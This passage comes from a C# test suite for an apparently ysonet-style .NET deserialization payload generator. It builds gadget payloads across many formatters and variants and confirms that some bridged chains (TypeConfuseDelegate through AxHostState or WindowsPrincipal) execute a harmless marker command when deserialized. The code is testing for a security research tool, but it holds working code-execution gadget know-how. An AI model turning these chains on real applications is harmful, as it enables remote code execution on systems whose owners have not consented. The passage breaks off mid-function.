                AssertTrue(caught != null, "an unwritable chain throws instead of skipping silently");
                AssertTrue(caught.Contains("ysonet_probe_none.txt"), "the error names the artifact");
                AssertTrue(caught.Contains(blocked) && caught.Contains(missing),
                    "the error lists every location it tried");

                // The real entry point resolves to a directory that exists and is writable.
                string dir = ResolveTestArtifactDir();
                AssertTrue(Directory.Exists(dir), "ResolveTestArtifactDir returns an existing directory");
                AssertEqual(Path.Combine(dir, "ysonet_x.txt"), TestArtifactPath("ysonet_x.txt"),
                    "TestArtifactPath builds on the resolved directory");
            }
            finally { SafeDeleteDir(root); }
        }

        // The sweep must remove only OLD "ysonet_*" entries. A fresh one belongs to a suite
        // running right now and must survive, and nothing outside the naming scheme may be
        // touched - the sweep runs against shared temp folders.
        private static void StaleArtifactSweep()
        {
            string dir = TestArtifactPath("ysonet_sweep_test");
            SafeDeleteDir(dir);
            Directory.CreateDirectory(dir);
            try
            {
                DateTime old = DateTime.UtcNow - TimeSpan.FromHours(5);

                string staleFile = Path.Combine(dir, "ysonet_fire_stale.txt");
                File.WriteAllText(staleFile, "x");
                File.SetLastWriteTimeUtc(staleFile, old);

                string staleDir = Path.Combine(dir, "ysonet_firedir_stale");
                Directory.CreateDirectory(staleDir);
                File.WriteAllText(Path.Combine(staleDir, "inside.txt"), "x");
                Directory.SetLastWriteTimeUtc(staleDir, old);

                string freshFile = Path.Combine(dir, "ysonet_fire_fresh.txt"); // a concurrent run
                File.WriteAllText(freshFile, "x");

                string wizardOut = Path.Combine(dir, "ysonet_payloads.txt");   // a user's own file
                File.WriteAllText(wizardOut, "x");
                File.SetLastWriteTimeUtc(wizardOut, old);

                string foreign = Path.Combine(dir, "keepme.txt");
                File.WriteAllText(foreign, "x");
                File.SetLastWriteTimeUtc(foreign, old);

                int removed = SweepStaleArtifacts(dir, TimeSpan.FromHours(1));

                AssertTrue(removed == 2, "sweep reports the two stale entries it removed (got " + removed + ")");
                AssertTrue(!File.Exists(staleFile), "a stale marker file is removed");
                AssertTrue(!Directory.Exists(staleDir), "a stale sink folder is removed with its contents");
                AssertTrue(File.Exists(freshFile), "a fresh artifact (a concurrent run) is kept");
                AssertTrue(File.Exists(wizardOut), "the wizard's default ysonet_payloads output is kept");
                AssertTrue(File.Exists(foreign), "a file outside the ysonet_ naming scheme is untouched");
                AssertTrue(SweepStaleArtifacts(Path.Combine(dir, "no_such_dir"), TimeSpan.Zero) == 0,
                    "a missing directory sweeps to zero instead of throwing");
            }
            finally { SafeDeleteDir(dir); }
        }

        // The gadget's own variant option token (--variant, or --internalgadget for
        // ResourceSet), matching Wizard.VariantFlag; used to pass a variant via ExtraArguments.
        private static string VariantFlagFor(IGenerator g)
        {
            foreach (OptionField f in OptionField.FromOptionSet(g.Options()))
                if (string.Equals(f.Name, "variant", StringComparison.OrdinalIgnoreCase)
                    || string.Equals(f.Name, "internalgadget", StringComparison.OrdinalIgnoreCase))
                    return f.CliFlag;
            return "--variant";
        }

        // A fresh InputArgs carrying a never-executed shell command (Test=false).
        private static InputArgs CalcInput()
        {
            InputArgs ia = new InputArgs();
            ia.Cmd = "calc.exe";
            ia.Test = false;
            return ia;
        }

        // ---- 6.2 gadget generation matrix ----

        // Every gadget x every supported formatter x every variant, crossed with minify
        // off/on, must produce a non-empty payload (Test=false, so nothing executes). A
        // new gadget/formatter/variant is picked up automatically. Cells that are
        // advertised but cannot generate in this environment go in expectedGadgetSkips
        // with a written reason; it starts empty (the one known advertised-but-broken
        // combo, ObjRef+ObjectStateFormatter, was fixed by removing OSF from ObjRef).
        private static void GadgetFullMatrixGenerates()
        {
            // Cells that are advertised but CANNOT generate because of a fundamental
            // serializer limitation. We do NOT skip these silently: the matrix asserts each
            // fails with the expected error, so the limitation is tested and any behavior
            // change (it starts working, or fails differently) is caught. Key forms:
            // "Gadget|Formatter", "Gadget|Formatter|variantN" (both match either minify state),
            // or the same with a trailing "|minify" to scope to the minified pass only.
            var expectedGadgetFailures = new Dictionary<string, string>(StringComparer.OrdinalIgnoreCase)
            {
                // SoapFormatter cannot serialize a generic type. Variant 1 of these gadgets is
                // TypeConfuseDelegate, whose payload contains a generic SortedSet, so no Soap
                // payload can be produced; variant 2 (TextFormattingRunProperties) is not generic
                // and serializes fine. Per-variant formatter support (GadgetVariant.Without +
                // GuardVariantFormatter) now catches this pair up front, so we assert the guard's
                // stable phrase - proving the guard fires BEFORE the deep framework exception and
                // the impossible combo is still tested (not silently skipped).
                { "ActivitySurrogateDisableTypeCheck|SoapFormatter|variant1",
                    "is not supported by variant 1" },
                { "XamlAssemblyLoadFromFile|SoapFormatter|variant1",
                    "is not supported by variant 1" },
                // DataTable variant 2 is TypeConfuseDelegate (a generic SortedSet), so its
                // SoapFormatter cell is the impossible one here; variant 1
                // (TextFormattingRunProperties) + SoapFormatter still generates.
                { "DataTable|SoapFormatter|variant2",
                    "is not supported by variant 2" },
                // The XML minifier is not text preserving (XmlXSLTMinifier trims text nodes,
                // the XmlDocument round trip drops a CR). The two strings this gadget carries
                // are user data the target uses literally, so the gadget verifies them after
                // minification and refuses rather than delivering a rewritten file. The shared
                // content fixture ends with a CRLF, so the minified NetDataContractSerializer
                // cell of the write variant must be refused. BinaryFormatter and LosFormatter
                // carry the string verbatim and are NOT listed here, which is the point: the
                // limitation belongs to the XML minifier, not to the gadget.
                { "TypeConfuseDelegateFileOperations|NetDataContractSerializer|variant1|minify",
                    "cannot use --minify with NetDataContractSerializer" },
            };

            // Cells whose MINIFIED output is XML but intentionally NOT standalone well-formed,
            // so the minified-XML parse check below skips them. Only ResourceSet's
            // NetDataContractSerializer path: its generator passes "</Values></Table></w>" as a
            // discardable string, deliberately dropping those trailing closing tags to shrink the
            // payload (see ResourceSetGenerator.cs). The NetDataContractSerializer deserializer
            // tolerates the truncated document - the generator's own -t path deserializes it - so
            // this is by design, not a minifier bug. Keyed by "gadget|formatter".
            var wellFormedExempt = new HashSet<string>(StringComparer.OrdinalIgnoreCase)
            {
                "ResourceSet|NetDataContractSerializer",
            };

            string csFixture = MakeTempFile("ysonet_matrix_fixture.cs",
                "public class YsonetTestFixture { public YsonetTestFixture() { } }");
            string dllFixture = new Uri(typeof(OptionSet).Assembly.CodeBase).LocalPath;
            string contentFixture = ContentFixture();

            bool trace = Environment.GetEnvironmentVariable("YSONET_TRACE") != null;
            var failures = new List<string>();
            int cells = 0;
            int expectedFailures = 0;
            try
            {
                foreach (string name in GadgetRegistry.GetAllGadgetNames())
                {
                    if (name == "Generic") continue;
                    // Same facet-derived exclusion as the normal-tier sweep: the
                    // combination matrix never builds a denial-of-service payload.
                    if (DosPolicy.IsDosGadget(name))
                    {
                        Console.Error.WriteLine("  [skip] matrix " + name + " (denial-of-service)");
                        continue;
                    }
                    if (trace) { Console.Error.WriteLine("  [matrix] " + name); Console.Error.Flush(); }
                    IGenerator g = GadgetRegistry.CreateGadgetInstance(name);
                    AssertTrue(g != null, "gadget loads: " + name);

                    var formatters = new List<string>();
                    foreach (string entry in g.SupportedFormatters())
                    {
                        string f = entry.Split(' ')[0];
                        if (!formatters.Contains(f)) formatters.Add(f);
                    }

                    var variants = g.Variants();
                    string variantFlag = VariantFlagFor(g);
                    int variantCount = (variants == null || variants.Count == 0) ? 1 : variants.Count;

                    foreach (string formatter in formatters)
                    {
                        for (int vi = 0; vi < variantCount; vi++)
                        {
                            GadgetVariant variant = (variants == null || variants.Count == 0) ? null : variants[vi];

                            for (int m = 0; m < 2; m++)
                            {
                                bool minify = m == 1;
                                CommandInputType inType = (variant == null)
                                    ? g.CommandInput() : variant.EffectiveInput(g.CommandInput());

                                string expectedError = ExpectedGadgetFailure(expectedGadgetFailures, name, formatter, variant, minify);

                                InputArgs ia = new InputArgs();
                                ia.Cmd = SampleInputForGadget(inType, csFixture, dllFixture, contentFixture);
                                ia.Minify = minify;
                                ia.Test = false;
                                // Pass the variant plus a xamlurl: the 3rd (SSRF) variant of
                                // ObjectDataProvider needs a xamlurl, not a shell command; gadgets
                                // without that option ignore the extra argument. Only ObjectDataProvider
                                // itself needs it now - WindowsClaimsIdentity used to as well, because
                                // its own --variant 3 leaked into the inner ObjectDataProvider; that
                                // leak is fixed by GenerateInner, and
                                // EveryVariantGeneratesFromTheVariantFlagAlone holds the line.
                                var extra = new List<string>();
                                if (variant != null) { extra.Add(variantFlag); extra.Add(variant.Number.ToString()); }
                                extra.Add("--xamlurl"); extra.Add("http://127.0.0.1/x");
                                ia.ExtraArguments = extra;

                                GenerationRequest req = new GenerationRequest
                                {
                                    GadgetName = name,
                                    FormatterName = formatter,
                                    OutputFormat = "",
                                    InputArgs = ia,
                                };

                                cells++;
                                string cellDesc = name + " -f " + formatter
                                    + (variant == null ? "" : " v" + variant.Number)
                                    + (minify ? " (minify)" : "");
                                if (trace) { Console.Error.WriteLine("    [cell] " + cellDesc + (expectedError != null ? " [expect-fail]" : "")); Console.Error.Flush(); }

                                RunResult r;
                                try { r = PayloadRunner.GenerateGadget(req); }
                                catch (Exception ex) { r = RunResult.Fail("THREW " + ex.Message); }

                                if (expectedError != null)
                                {
                                    // A known-impossible combination: assert it fails with the
                                    // expected error, so the limitation is tested (not ignored).
                                    if (r.Success)
                                        failures.Add(cellDesc + " -> expected the '" + expectedError + "' limitation but generation SUCCEEDED (the limitation may be gone; update the test)");
                                    else if ((r.ErrorMessage ?? "").IndexOf(expectedError, StringComparison.OrdinalIgnoreCase) < 0)
                                        failures.Add(cellDesc + " -> failed with an UNEXPECTED error (wanted '" + expectedError + "'): " + r.ErrorMessage);
                                    else
                                        expectedFailures++;
                                }
                                else
                                {
                                    if (!r.Success) failures.Add(cellDesc + " -> " + r.ErrorMessage);
                                    else if (RawIsEmpty(r.Raw)) failures.Add(cellDesc + " -> empty payload");
                                    else if (minify && !wellFormedExempt.Contains(name + "|" + formatter))
                                    {
                                        // A minified payload whose output is XML must stay well-formed
                                        // XML - the minifier must never break it. Non-XML outputs
                                        // (binary/base64/JSON/YAML) are skipped by the helper; the
                                        // documented intentional-fragment cells are exempt above.
                                        string xmlErr = XmlWellFormednessError(r.Raw);
                                        if (xmlErr != null)
                                            failures.Add(cellDesc + " -> minified XML is not well-formed: " + xmlErr);
                                    }
                                }
                            }
                        }
                    }
                }
            }
            finally
            {
                try { File.Delete(csFixture); } catch { }
                try { File.Delete(contentFixture); } catch { }
            }

            AssertTrue(cells > 100, "matrix exercised many cells (was " + cells + ")");
            // Three variant-scoped SoapFormatter-generics keys, each matching both minify
            // states = six required expected-failure cells (two of them the new DataTable
            // variant-2 pair), plus the minify-only file-operations text-preservation cell.
            // This floor forces those cells to actually be reached and guarded, not merely
            // sit unused in the dictionary.
            AssertTrue(expectedFailures >= 7,
                "the known SoapFormatter-generics limitation cells were exercised (was " + expectedFailures + ")");
            AssertTrue(failures.Count == 0,
                "gadget matrix cells failed (" + failures.Count + " of " + cells + "; " + expectedFailures + " expected-failures verified):\n  "
                + string.Join("\n  ", failures.ToArray()));
        }

        // Look up the expected-failure error for a matrix cell, or null if the cell should
        // generate. Checks the most specific key first (variant + minify) down to the gadget
        // + formatter, so a "Gadget|Formatter|variantN" entry matches both minify states.
        private static string ExpectedGadgetFailure(Dictionary<string, string> map, string name, string formatter, GadgetVariant variant, bool minify)
        {
            string vk = variant == null ? "" : "|variant" + variant.Number;
            var keys = new List<string>();
            if (minify)
            {
                keys.Add(name + "|" + formatter + vk + "|minify");
                keys.Add(name + "|" + formatter + "|minify");
            }
            keys.Add(name + "|" + formatter + vk);
            keys.Add(name + "|" + formatter);
            foreach (string k in keys)
            {
                string v;
                if (map.TryGetValue(k, out v)) return v;
            }
            return null;
        }

        // --rootcontainer is a plain option, not a variant, so the matrix above does not cross it
        // (it crosses variants only). This is its own grid: for the TypeConfuseDelegate
        // wrapper of both consumers, every container x every advertised formatter x minify
        // off/on must produce a non-empty payload, and every container of one gadget must
        // produce a DIFFERENT payload from the others so no cell silently falls back.
        private static void XamlContainerFullMatrix()
        {
            var failures = new List<string>();
            int cells = 0;

            // ActivitySurrogateDisableTypeCheck ignores -c, so it gets the whole grid.
            foreach (string formatter in XamlContainerFormatters)
            {
                for (int m = 0; m < 2; m++)
                {
                    bool minify = m == 1;
                    var seen = new List<byte[]>();
                    foreach (int container in new[] { 1, 2, 3 })
                    {
                        string cell = "ActivitySurrogateDisableTypeCheck -f " + formatter
                            + " --rootcontainer " + container + (minify ? " (minify)" : "");
                        cells++;
                        RunResult r;
                        try { r = GenerateXamlContainer("ActivitySurrogateDisableTypeCheck", "calc.exe", 1, container, formatter, minify); }
                        catch (Exception ex) { r = RunResult.Fail("THREW " + ex.Message); }

                        if (!r.Success) { failures.Add(cell + " -> " + r.ErrorMessage); continue; }
                        if (RawIsEmpty(r.Raw)) { failures.Add(cell + " -> empty payload"); continue; }

                        byte[] bytes = Bytes(r.Raw);
                        foreach (byte[] earlier in seen)
                            if (BytesEqual(earlier, bytes))
                                failures.Add(cell + " -> produced the same bytes as an earlier container");
                        seen.Add(bytes);
                    }
                }
            }

            // XamlAssemblyLoadFromFile compiles the .cs on EVERY generation, so it is scoped
            // to BinaryFormatter x minify: the wrapper code path is identical to the grid
            // above, and its runtime effect for containers 2 and 3 is fired for real in
            // PayloadsFireIntoTestSinks.
            string cs = MakeTempFile("ysonet_container_matrix.cs",
                "public class YsonetContainerMatrix { public YsonetContainerMatrix() { } }");
            try
            {
                for (int m = 0; m < 2; m++)
                {
                    bool minify = m == 1;
                    foreach (int container in new[] { 1, 2, 3 })
                    {
                        string cell = "XamlAssemblyLoadFromFile -f BinaryFormatter --rootcontainer "
                            + container + (minify ? " (minify)" : "");
                        cells++;
                        RunResult r;
                        try { r = GenerateXamlContainer("XamlAssemblyLoadFromFile", cs, 1, container, "BinaryFormatter", minify); }
                        catch (Exception ex) { r = RunResult.Fail("THREW " + ex.Message); }

                        if (!r.Success) { failures.Add(cell + " -> " + r.ErrorMessage); continue; }
                        if (RawIsEmpty(r.Raw)) { failures.Add(cell + " -> empty payload"); continue; }

                        // The wire shape, checked here rather than in the normal tier: these
                        // cells already pay for the compile. A byte comparison is impossible
                        // (each compile embeds a fresh module id), so assert the chosen root.
                        string text = Encoding.ASCII.GetString(Bytes(r.Raw));
                        string wanted = container == 1 ? "System.Collections.Generic.SortedSet`1"
                            : container == 2 ? "System.Collections.Generic.SortedDictionary`2"
                            : "System.Collections.Generic.TreeSet`1";
                        if (!text.Contains(wanted))
                            failures.Add(cell + " -> does not serialize " + wanted);
                        if (container != 1 && text.Contains("System.Collections.Generic.SortedSet`1"))
                            failures.Add(cell + " -> still emits a SortedSet type record");
                    }
                }
            }
            finally { SafeDelete(cs); }

            AssertTrue(cells == 24, "the container grid covered every cell (was " + cells + ")");
            AssertTrue(failures.Count == 0,
                "XAML container cells failed (" + failures.Count + " of " + cells + "):\n  "
                + string.Join("\n  ", failures.ToArray()));
        }

        // ---- 6.5 output encodings per formatter ----

        // Prove every output encoding is correct for every FORMATTER, using one
        // representative gadget per unique formatter (no need to multiply the gadget
        // matrix by encodings). ObjectStateFormatter is intentionally offered by no
        // gadget (it equals LosFormatter without a MAC), so it is absent here by design.
        private static void OutputEncodingPerFormatter()
        {
            var reps = new List<string[]>
            {
                new[] { "ObjectDataProvider", "Xaml" },
                new[] { "ObjectDataProvider", "Json.NET" },
                new[] { "ObjectDataProvider", "FastJson" },
                new[] { "ObjectDataProvider", "JavaScriptSerializer" },
                new[] { "ObjectDataProvider", "XmlSerializer" },
                new[] { "ObjectDataProvider", "DataContractSerializer" },
                new[] { "ObjectDataProvider", "YamlDotNet" },
                new[] { "ObjectDataProvider", "FsPickler" },
                new[] { "ObjectDataProvider", "SharpSerializerBinary" },
                new[] { "ObjectDataProvider", "SharpSerializerXml" },
                new[] { "ObjectDataProvider", "MessagePackTypeless" },
                new[] { "ObjectDataProvider", "MessagePackTypelessLz4" },
                new[] { "TypeConfuseDelegate", "BinaryFormatter" },
                new[] { "TypeConfuseDelegate", "NetDataContractSerializer" },
                new[] { "TypeConfuseDelegate", "LosFormatter" },
                new[] { "TextFormattingRunProperties", "SoapFormatter" },
                new[] { "WindowsPrincipal", "DataContractJsonSerializer" },
            };

            foreach (string[] rep in reps)
            {
                GenerationRequest req = new GenerationRequest
                {
                    GadgetName = rep[0],
                    FormatterName = rep[1],
                    OutputFormat = "",
                    InputArgs = CalcInput(),
                };
                RunResult r = PayloadRunner.GenerateGadget(req);
                AssertTrue(r.Success && !RawIsEmpty(r.Raw),
                    "generate " + rep[0] + " -f " + rep[1] + ": " + r.ErrorMessage);

                // The empty/auto output format must resolve to the default rule
                // (base64 for the binary-ish formatters, raw for the text ones).
                AssertEqual(PayloadRunner.GetDefaultOutputFormat(rep[1]), r.EffectiveOutputFormat,
                    rep[1] + " default output format");

                EncodeAndVerify(r.Raw, rep[0] + "/" + rep[1]);
            }

            // Both plugin output shapes: ApplicationTrust returns a string, and
            // TransactionManagerReenlist returns a byte[] (calc.exe is never executed here).
            ResetPluginStatics(typeof(ysonet.Plugins.ApplicationTrustPlugin));
            RunResult at = PayloadRunner.RunPlugin("ApplicationTrust", new string[] { "-c", "calc.exe" });
            AssertTrue(at.Success && at.Raw is string, "ApplicationTrust returns a string payload: " + at.ErrorMessage);
            EncodeAndVerify(at.Raw, "plugin/ApplicationTrust(string)");

            ResetPluginStatics(typeof(ysonet.Plugins.TransactionManagerReenlistPlugin));
            RunResult tm = PayloadRunner.RunPlugin("TransactionManagerReenlist", new string[] { "-c", "calc.exe" });
            AssertTrue(tm.Success && tm.Raw is byte[], "TransactionManagerReenlist returns a byte[] payload: " + tm.ErrorMessage);
            EncodeAndVerify(tm.Raw, "plugin/TransactionManagerReenlist(byte[])");
        }

        // ---- 6.6 bridged gadget chains (--bgc) ----

        // The --bgc mechanism is otherwise untested. Every consumer tagged Bridged with
        // a real SupportedBridgedFormatter() must generate a chain leaf,consumer; a
        // non-Bridged gadget must be rejected; and chains must fire end to end.
        private static void BridgedChainsGenerate()
        {
            var failures = new List<string>();
            int consumers = 0;
            foreach (string name in GadgetRegistry.GetAllGadgetNames())
            {
                if (name == "Generic") continue;
                IGenerator g = GadgetRegistry.CreateGadgetInstance(name);
                if (g == null || !g.Labels().Contains(GadgetTags.Bridged)) continue;
                string bridgedFmt = g.SupportedBridgedFormatter();
                if (string.IsNullOrEmpty(bridgedFmt)) continue; // skip any bridge that declares no formatter (none currently)

                consumers++;
                // The leaf must produce the consumer's expected bridged formatter.
                string leaf = bridgedFmt.Equals("LosFormatter", StringComparison.OrdinalIgnoreCase)
                    ? "TextFormattingRunProperties" : "TypeConfuseDelegate";
                string finalFmt = g.SupportedFormatters()[0].Split(' ')[0];

                GenerationRequest req = new GenerationRequest
                {
                    GadgetName = name,
                    BridgedGadgetChain = leaf,
                    FormatterName = finalFmt,
                    OutputFormat = "",
                    InputArgs = CalcInput(),
                };
                RunResult r = PayloadRunner.GenerateGadget(req);
                if (!r.Success || RawIsEmpty(r.Raw))
                    failures.Add(leaf + "," + name + " -f " + finalFmt + " -> " + (r.Success ? "empty" : r.ErrorMessage));
            }

            AssertTrue(consumers >= 14, "found the bridged consumers (was " + consumers + ")");
            AssertTrue(failures.Count == 0,
                "bridged chains failed (" + failures.Count + "):\n  " + string.Join("\n  ", failures.ToArray()));

            // WindowsPrincipal now declares a real bridged formatter (BinaryFormatter), so it
            // must be a valid bridge consumer (regression: it used to report None and be rejected).
            RunResult wp = PayloadRunner.GenerateGadget(new GenerationRequest
            {
                GadgetName = "WindowsPrincipal",
                BridgedGadgetChain = "TypeConfuseDelegate",
                FormatterName = "BinaryFormatter",
                OutputFormat = "",
                InputArgs = CalcInput(),
            });
            AssertTrue(wp.Success && !RawIsEmpty(wp.Raw), "WindowsPrincipal accepts a bridged chain: " + wp.ErrorMessage);

            // DataSetOldBehaviourFromFile is not tagged Bridged, so it must be rejected.
            RunResult dsff = PayloadRunner.GenerateGadget(new GenerationRequest
            {
                GadgetName = "DataSetOldBehaviourFromFile",
                BridgedGadgetChain = "TypeConfuseDelegate",
                FormatterName = "BinaryFormatter",
                OutputFormat = "",
                InputArgs = CalcInput(),
            });
            AssertTrue(!dsff.Success, "DataSetOldBehaviourFromFile is rejected as a bridge consumer (not tagged Bridged)");

            // One bridged chain must actually execute end to end: TypeConfuseDelegate
            // wrapped in AxHostState, fired via BinaryFormatter into a marker sink.
            string marker = TestArtifactPath("ysonet_bgc_fire.txt");
            if (File.Exists(marker)) File.Delete(marker);
            try
            {
                InputArgs fa = new InputArgs();
                fa.Cmd = "cmd /c echo x > \"" + marker + "\"";
                fa.IsRawCmd = true;
                fa.Test = false;
                RunResult fr = PayloadRunner.GenerateGadget(new GenerationRequest
                {
                    GadgetName = "AxHostState",
                    BridgedGadgetChain = "TypeConfuseDelegate",
                    FormatterName = "BinaryFormatter",
                    OutputFormat = "",
                    InputArgs = fa,
                });
                AssertTrue(fr.Success && fr.Raw is byte[], "bridged chain generated for firing: " + fr.ErrorMessage);
                RunSTA(delegate { SerializersHelper.BinaryFormatter_deserialize((byte[])fr.Raw); });
                AssertTrue(WaitForFile(marker, MarkerWaitMs), "the bridged chain TypeConfuseDelegate,AxHostState fired end to end");
            }
            finally
            {
                SafeDelete(marker);
            }

            // The newly bridged consumer must ALSO fire end to end, not just generate:
            // TypeConfuseDelegate wrapped in WindowsPrincipal, via BinaryFormatter. This
            // proves the bridged BF blob reaches and fires from the inner ClaimsIdentity's
            // bootstrapContext, the whole point of making WindowsPrincipal a bridge.
            string wpMarker = TestArtifactPath("ysonet_bgc_wp_fire.txt");
            if (File.Exists(wpMarker)) File.Delete(wpMarker);
            try
            {
                InputArgs fa = new InputArgs();
                fa.Cmd = "cmd /c echo x > \"" + wpMarker + "\"";
                fa.IsRawCmd = true;
                fa.Test = false;
                RunResult fr = PayloadRunner.GenerateGadget(new GenerationRequest
                {
                    GadgetName = "WindowsPrincipal",
                    BridgedGadgetChain = "TypeConfuseDelegate",
                    FormatterName = "BinaryFormatter",
                    OutputFormat = "",
                    InputArgs = fa,
                });
                AssertTrue(fr.Success && fr.Raw is byte[], "WindowsPrincipal bridged chain generated for firing: " + fr.ErrorMessage);
                RunSTA(delegate { SerializersHelper.BinaryFormatter_deserialize((byte[])fr.Raw); });
                AssertTrue(WaitForFile(wpMarker, MarkerWaitMs), "the bridged chain TypeConfuseDelegate,WindowsPrincipal fired end to end");
            }
            finally
            {
                SafeDelete(wpMarker);
            }
        }

        // Minify must propagate THROUGH a bridged gadget chain. PayloadRunner shares one InputArgs
        // (and its Minify flag) across every gadget in the chain, so the leaf (bridge producer) and
        // the consumer both have to minify. Proof the flag actually reached them: the minified
        // chain output is strictly smaller than the non-minified one - the leaf's BF/Los/etc. blob
        // shrinks with loose type names and the consumer embeds that smaller blob. If Minify were
        // dropped anywhere in the chain the two outputs would be identical (== raw), which this
        // test rejects. Every Bridged consumer is covered, and one chain is fired both ways to
        // prove minify does not break bridged execution end to end.
        private static void BridgedChainsMinifyPropagates()
        {
            var broken = new List<string>();
            var noEffect = new List<string>();
            int consumers = 0, shrank = 0;
            foreach (string name in GadgetRegistry.GetAllGadgetNames())
            {
                if (name == "Generic") continue;
                IGenerator g = GadgetRegistry.CreateGadgetInstance(name);
                if (g == null || !g.Labels().Contains(GadgetTags.Bridged)) continue;
                string bridgedFmt = g.SupportedBridgedFormatter();
                if (string.IsNullOrEmpty(bridgedFmt)) continue; // skip any bridge that declares no formatter (none currently)

                consumers++;
                string leaf = bridgedFmt.Equals("LosFormatter", StringComparison.OrdinalIgnoreCase)
                    ? "TextFormattingRunProperties" : "TypeConfuseDelegate";
                string finalFmt = g.SupportedFormatters()[0].Split(' ')[0];

                RunResult raw = BridgeGen(name, leaf, finalFmt, false);
                RunResult min = BridgeGen(name, leaf, finalFmt, true);
                string chain = leaf + "," + name + " -f " + finalFmt;
                if (!raw.Success || RawIsEmpty(raw.Raw)) { broken.Add(chain + " -> raw " + (raw.Success ? "empty" : raw.ErrorMessage)); continue; }
                if (!min.Success || RawIsEmpty(min.Raw)) { broken.Add(chain + " -> min " + (min.Success ? "empty" : min.ErrorMessage)); continue; }
                int rl = RawLength(raw.Raw), ml = RawLength(min.Raw);
                if (ml > rl) broken.Add(chain + " -> --minify GREW the payload (min=" + ml + " > raw=" + rl + ")");
                else if (ml == rl) noEffect.Add(chain + " -> --minify changed nothing (both " + rl + " bytes); flag may not propagate");
                else shrank++;
            }

            AssertTrue(consumers >= 14, "found the bridged consumers (was " + consumers + ")");
            AssertTrue(broken.Count == 0,
                "bridged chains failed or grew under --minify (" + broken.Count + "):\n  " + string.Join("\n  ", broken.ToArray()));
            AssertTrue(noEffect.Count == 0,
                "bridged chains where --minify had no effect - the flag likely did not reach the chain (" + noEffect.Count + "):\n  " + string.Join("\n  ", noEffect.ToArray()));
            AssertTrue(shrank == consumers, "every bridged chain shrinks with --minify (" + shrank + "/" + consumers + ")");

            // Fire the representative chain BOTH ways: minify must not break bridged execution.
            FireBridgedChain(false);
            FireBridgedChain(true);
        }

        private static RunResult BridgeGen(string consumer, string leaf, string finalFmt, bool minify)
        {
            InputArgs ia = new InputArgs();
            ia.Cmd = "calc.exe";
            ia.Test = false;
            ia.Minify = minify;
            return PayloadRunner.GenerateGadget(new GenerationRequest
            {
                GadgetName = consumer,
                BridgedGadgetChain = leaf,
                FormatterName = finalFmt,
                OutputFormat = "",
                InputArgs = ia,
            });
        }

        private static void FireBridgedChain(bool minify)
        {
            string marker = MarkerPath("bgc_min_" + (minify ? "m" : "n"));
            SafeDelete(marker);
            try
            {
                InputArgs ia = new InputArgs();
                ia.Cmd = MarkerCommand(marker);
                ia.IsRawCmd = true;
                ia.Test = false;
                ia.Minify = minify;
                RunResult r = PayloadRunner.GenerateGadget(new GenerationRequest
                {
                    GadgetName = "AxHostState",
                    BridgedGadgetChain = "TypeConfuseDelegate",
                    FormatterName = "BinaryFormatter",
                    OutputFormat = "",
                    InputArgs = ia,
                });
                AssertTrue(r.Success && r.Raw is byte[], "bridged chain generated (minify=" + minify + "): " + r.ErrorMessage);
                RunSTA(delegate { SerializersHelper.BinaryFormatter_deserialize((byte[])r.Raw); });
                AssertTrue(WaitForFile(marker, MarkerWaitMs), "bridged TypeConfuseDelegate,AxHostState fired (minify=" + minify + ")");
            }
            finally { SafeDelete(marker); }
        }

        // WindowsPrincipal is newly bridge-capable, and it advertises SEVEN output formatters.
        // The generic bgc sweep only exercises a consumer's first formatter, so this proves the
        // bridge for EVERY WindowsPrincipal formatter on three axes:
        //   1) it generates a non-empty payload (Test=false),
        //   2) --minify still reaches the whole chain (the minified payload is strictly smaller
        //      than the raw one - the bridged BF blob shrinks with loose type names and the
        //      consumer embeds that smaller blob; equal size would mean --minify never arrived),
        //   3) it actually FIRES the bridged blob end to end, minify off AND on.
        // Firing reuses the gadget's own Test=true self-test (which deserializes with that
        // formatter's own helper) on an STA thread. Nothing is skipped: a formatter that does not
        // generate, shrink, or fire is a real failure, not an ignored case.
        private static void WindowsPrincipalBridgeEveryFormatter()
        {
            IGenerator wp = GadgetRegistry.CreateGadgetInstance("WindowsPrincipal");
            AssertTrue(wp != null && wp.Labels().Contains(GadgetTags.Bridged)
                && wp.SupportedBridgedFormatter() == "BinaryFormatter",
                "WindowsPrincipal is a BinaryFormatter bridge consumer");

            var genFail = new List<string>();
            var minFail = new List<string>();
            var fireFail = new List<string>();
            int formatters = 0;
            foreach (string f in wp.SupportedFormatters())
            {
                string fmt = f.Split(' ')[0];
                formatters++;

                // 1) Generation, minify off and on (Test=false): both must produce bytes/text.
                RunResult raw = GenWindowsPrincipalBridge(fmt, false);
                RunResult min = GenWindowsPrincipalBridge(fmt, true);
                if (!raw.Success || RawIsEmpty(raw.Raw)) { genFail.Add(fmt + " -> raw " + (raw.Success ? "empty" : raw.ErrorMessage)); continue; }
                if (!min.Success || RawIsEmpty(min.Raw)) { genFail.Add(fmt + " -> min " + (min.Success ? "empty" : min.ErrorMessage)); continue; }

                // 2) --minify must reach the chain: the minified output is strictly smaller.
                int rl = RawLength(raw.Raw), ml = RawLength(min.Raw);
                if (ml >= rl) minFail.Add(fmt + " -> --minify had no effect (min=" + ml + " >= raw=" + rl + ")");

                // 3) Fire the whole bridged chain, minify off and on.
                foreach (bool minify in new[] { false, true })
                {
                    if (!FiresWindowsPrincipalBridge(fmt, minify))
                        fireFail.Add(fmt + (minify ? " (minified)" : ""));
                }
            }

            AssertTrue(formatters >= 7, "WindowsPrincipal advertises its formatters (was " + formatters + ")");
            AssertTrue(genFail.Count == 0,
                "WindowsPrincipal bridged generation failed (" + genFail.Count + "):\n  " + string.Join("\n  ", genFail.ToArray()));
            AssertTrue(minFail.Count == 0,
                "WindowsPrincipal bridged --minify did not propagate (" + minFail.Count + "):\n  " + string.Join("\n  ", minFail.ToArray()));
            AssertTrue(fireFail.Count == 0,
                "WindowsPrincipal bridged chain did not fire (" + fireFail.Count + "):\n  " + string.Join("\n  ", fireFail.ToArray()));
        }

        // Generate TypeConfuseDelegate,WindowsPrincipal for one formatter (Test=false), with the
        // given minify flag, and return the raw RunResult for size comparison.
        private static RunResult GenWindowsPrincipalBridge(string formatter, bool minify)
        {
            InputArgs ia = new InputArgs();
            ia.Cmd = "calc.exe";
            ia.Test = false;
            ia.Minify = minify;
            return PayloadRunner.GenerateGadget(new GenerationRequest
            {
                GadgetName = "WindowsPrincipal",
                BridgedGadgetChain = "TypeConfuseDelegate",
                FormatterName = formatter,
                OutputFormat = "",
                InputArgs = ia,
            });
        }

        // Generate TypeConfuseDelegate,WindowsPrincipal for one formatter with Test=true so the
        // gadget's own self-test deserializes and fires it in-process (STA), and report whether
        // the marker was written. Returns false if it did not fire.
        private static bool FiresWindowsPrincipalBridge(string formatter, bool minify)
        {
